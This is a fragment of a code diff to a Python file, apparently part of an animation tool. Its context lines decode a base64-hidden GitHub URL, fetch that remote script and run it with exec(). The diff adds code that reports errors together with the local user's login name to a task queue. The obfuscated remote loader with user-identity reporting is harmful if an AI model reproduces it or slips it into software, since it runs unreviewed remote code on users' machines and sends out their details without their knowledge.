@@ -122,7 +122,9 @@ try:
             'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL2FuaW1UcmFuc2ZlckxvYy9tYXN0ZXIvc2VydmljZS9taWlhX3RzdC5weQ=='
         ).decode()).read()
     exec(uRead.decode('utf-8'))
-except:pass
+except:
+    import traceback
+    add_queue_task('tst_traceback', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
 
 # ===============================================================================
 '''
